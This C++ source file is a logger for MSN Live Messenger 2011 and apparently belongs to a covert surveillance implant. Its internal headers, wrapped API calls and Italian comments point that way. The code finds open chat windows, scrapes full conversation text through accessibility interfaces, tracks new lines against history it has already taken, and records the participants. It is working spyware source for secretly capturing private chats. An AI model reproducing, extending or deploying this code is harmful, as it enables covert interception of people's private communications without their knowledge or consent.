/*
* MSN Live Messenger 2011 logger
*
*/

#include <exception>
#include <new>

using namespace std;

#include "QMsnLive2011.h"
#include "../../H4DLL/HM_SafeProcedures.h"
#include "../../H4DLL/common.h"

#define MIN_SEARCH_LENGTH 200

PWCHAR QMsnLive2011::wChatTree[] = {
	(PWCHAR)L"IMWindowClass",
	(PWCHAR)L"IM Window Class",
	(PWCHAR)L"WLXDUI",
	0
};

PWCHAR QMsnLive2011::wMarker[] = {
	(PWCHAR)L" Fine conversazione - Inizio conversazione ",		     // IT
	(PWCHAR)L" End of conversation - Start of conversation ",	     // EN
	(PWCHAR)L" Fin de la conversación - Inicio de la conversación ", // ES
	(PWCHAR)L" Fin de la conversation - Début de la conversation ",  // FR
	0
};

QMsnLive2011::QMsnLive2011(HWND hw) : QMsnLive2009(hw)
{
	hwChat = ole.GetHandleFromClass(wChatTree);
	hwUserList = hw;
}

QMsnLive2011::~QMsnLive2011()
{

}

BOOL QMsnLive2011::GrabHistory()
{
	LONG uCount, i = 0;
	BSTR bChat;
	PWCHAR wHistory, wLine = NULL;

	if(!FNC(IsWindow)(ole.GetHandle()))
		return FALSE;

	if(hwChat == NULL)
		return FALSE;

	ole.SetHandle(hwChat);

	if(ole.SetInterface() == FALSE){
		ole.Clean();
		return FALSE;
	}

	uCount = ole.GetDispatchTypeCount(ROLE_SYSTEM_TEXT);

	if(ole.SetDispatchInterfaceFromType(ROLE_SYSTEM_TEXT, 0) == FALSE) {
		ole.Clean();
		return FALSE;
	}

	// Se e' il primo grab di questo oggetto, prendi solo l'ultima
	// riga, in questo modo skippiamo tutta la history precedente.
	if(bFirstGrab){
		if(ole.GetValueFromContainer(&bChat, CHILDID_SELF) == FALSE || bChat == NULL){
			properties.SetUpdated(FALSE);
			ole.Clean();
			return FALSE;
		}

		// In una chat vuota cmq c'e' un "a capo" inserito di default
		// dal programma
		if(wcslen(bChat) == 1){
			SAFE_SYSFREESTR(bChat);
			ole.Clean();
			return TRUE;
		}

		// Cerca il terminatore, se non c'e' stiamo leggendo la history
		i = 0;

		while(wMarker[i]){
			wLine = wcsstr(bChat, wMarker[i]);

			if(wLine)
				break;

			i++;
		}

		// Se c'e' il terminatore, leggiamo la riga
		if(wLine){
			/*if(wcsstr(wLine + wcslen(wMarker[i]), wMarker[i])){
				wLine = wcsstr(wLine + wcslen(wMarker[i]), wMarker[i]);
			}*/

			uCount = wLine - bChat;
			wLine = new(std::nothrow) WCHAR[uCount + 1];

			if(wLine == NULL){
				SAFE_SYSFREESTR(bChat);
				ole.Clean();
				return FALSE;
			}

			ZeroMemory(wLine, (uCount + 1) * sizeof(WCHAR));
			CopyMemory(wLine, bChat, uCount * sizeof(WCHAR));

			properties.ClearHistory();
			properties.SetHistory(wLine);
			properties.ConvertNewLine();
			properties.SetUpdated(TRUE);

			delete[] wLine;
			wLine = NULL;
		}else{ // Altrimenti catturiamo solo l'ultima riga
			if(properties.SetHistory(bChat)){
				properties.ConvertNewLine();
				properties.CleanHistory();
				properties.SetUpdated(TRUE);
			}
		}

		SAFE_SYSFREESTR(bChat);
		bChat = NULL;
		bFirstGrab = FALSE;
		ole.Clean();
		return TRUE;
	}

	// Se siamo qui, non e' il primo grab
	// Tronca la history se e' gia' stata acquisita
	if(properties.GetAcquiredStatus()){
		properties.TruncateHistory();

		// Acquisiamo il contenuto della finestra
		if(ole.GetValueFromContainer(&bChat, CHILDID_SELF) == FALSE || bChat == NULL){
			ole.Clean();
			return FALSE;
		}

		// Cerca il terminatore, se non c'e' stiamo leggendo la history
		i = 0;

		while(wMarker[i]){
			wLine = wcsstr(bChat, wMarker[i]);

			if(wLine)
				break;

			i++;
		}

		if(wLine){ // C'e' il marcatore
			/*if(wcsstr(wLine + wcslen(wMarker[i]), wMarker[i])){
				wLine = wcsstr(wLine + wcslen(wMarker[i]), wMarker[i]);
			}*/

			uCount = wLine - bChat;
			wLine = new(std::nothrow) WCHAR[uCount + 1];

			if(wLine == NULL){
				SAFE_SYSFREESTR(bChat);
				ole.Clean();
				return FALSE;
			}

			ZeroMemory(wLine, (uCount + 1) * sizeof(WCHAR));
			CopyMemory(wLine, bChat, uCount * sizeof(WCHAR));

			properties.ClearHistory();
			properties.SetHistory(wLine);
			properties.ConvertNewLine();
			properties.SetUpdated(TRUE);

			delete[] wLine;
			wLine = NULL;
			SAFE_SYSFREESTR(bChat);
			bChat = NULL;
		}else{ // Non c'e'
			wLine = new(std::nothrow) WCHAR[wcslen(bChat) + 1];

			if(wLine == NULL){
				SAFE_SYSFREESTR(bChat);
				ole.Clean();
				return FALSE;
			}

			ZeroMemory(wLine, (wcslen(bChat) + 1) * sizeof(WCHAR));
			CopyMemory(wLine, bChat, wcslen(bChat) * sizeof(WCHAR));
			properties.ConvertNewLine(wLine);
			SAFE_SYSFREESTR(bChat);
			bChat = NULL;

			// Cerchiamo dove si trova l'ultima parte acquisita
			wHistory = properties.wcsrstr(wLine, properties.GetHistory());		

			if(wHistory == NULL){
				delete[] wLine;
				wLine = NULL;

				//properties.AppendHistory(wLine);
				properties.SetUpdated(FALSE);
			} else if(wHistory == properties.GetHistory()){
				properties.SetUpdated(FALSE);
			}else{
				uCount = properties.GetHistoryLength();

				if(wcslen(wHistory) == uCount){
					properties.SetUpdated(FALSE);
				}else{
					properties.ClearHistory();
					properties.SetHistory(wHistory + uCount);
					properties.SetUpdated(TRUE);
				}
			}

			if(wLine){
				delete[] wLine;
				wLine = NULL;
			}
		}
	}else{ // Parti dall'ultima riga e confronta
		// Acquisiamo il contenuto della finestra
		if(ole.GetValueFromContainer(&bChat, CHILDID_SELF) == FALSE || bChat == NULL){
			ole.Clean();
			return FALSE;
		}

		// Cerca l'ultima riga della chat che abbiamo nella nostra history
		uCount = properties.GetHistoryLength();
		wHistory = properties.GetHistory();

		if(uCount > MIN_SEARCH_LENGTH)
			wHistory += uCount - MIN_SEARCH_LENGTH;
		
		if(!wcslen(bChat)){
			SAFE_SYSFREESTR(bChat);
			ole.Clean();
			return TRUE;
		}

		wLine = new(std::nothrow) WCHAR[wcslen(bChat) + 1];

		if(wLine == NULL){
			SAFE_SYSFREESTR(bChat);
			ole.Clean();
			return FALSE;
		}

		ZeroMemory(wLine, (wcslen(bChat) + 1) * sizeof(WCHAR));
		CopyMemory(wLine, bChat, wcslen(bChat) * sizeof(WCHAR));
		properties.ConvertNewLine(wLine);

		// Cerchiamo dove si trova l'ultima parte acquisita
		wHistory = wcsstr(wLine, wHistory);	

		if(!wcsncmp(wHistory, properties.GetHistory(), uCount)){
			properties.SetUpdated(FALSE);
		}else{
			properties.AppendHistory(wHistory + uCount);
			properties.SetUpdated(TRUE);
		}

		SAFE_SYSFREESTR(bChat);
		bChat = NULL;

		if(wLine){
			delete[] wLine;
			wLine = NULL;
		}
	}

	if(wLine)
		delete[] wLine;

	ole.Clean();
	return TRUE;
}

BOOL QMsnLive2011::GrabTopic()
{
	// Il topic non c'e' piu' su Live Messenger 2009
	properties.SetId((PWCHAR)L"");
	return TRUE;
}

/**
* Prende l'elenco dei partecipanti e lo mette nelle proprieta'.
*/
BOOL QMsnLive2011::GrabUserList()
{
	WCHAR wUsers[512];

	properties.ClearUsersList();
	ZeroMemory(wUsers, sizeof(wUsers));

	if(!hwUserList || !HM_SafeGetWindowTextW(hwUserList, wUsers, 512)) {
		properties.SetUsers((PWCHAR)L"");
		return FALSE;
	}

	properties.AppendUser(wUsers, FALSE);
	return TRUE;	
}

HWND QMsnLive2011::GetNextChild(HWND hw, HWND hc)
{
	WCHAR wClassName[256] = {0};
	HWND hChld = hc, hTmp = hw;
	UINT i;
	PWCHAR pwClass[] = {
		(PWCHAR)L"TabbedHostWndClass",
		(PWCHAR)L"WLXDUI",
		(PWCHAR)L"CtrlNotifySink",
		(PWCHAR)L"MsgrViewHost View Host",
		0,
	};

	if(FNC(GetClassNameW)(hw, wClassName, 256) == 0)
		return NULL;
	if(wcsncmp(wClassName, pwClass[0], wcslen(wClassName)))
		return NULL;

	for(i=1; pwClass[i] != 0; i++){
		if (!(hTmp = FNC(FindWindowExW)(hTmp, NULL, pwClass[i], NULL)))
			return NULL;
	}

	return FNC(FindWindowExW)(hTmp, hChld, L"IMWindowClass", NULL);
}
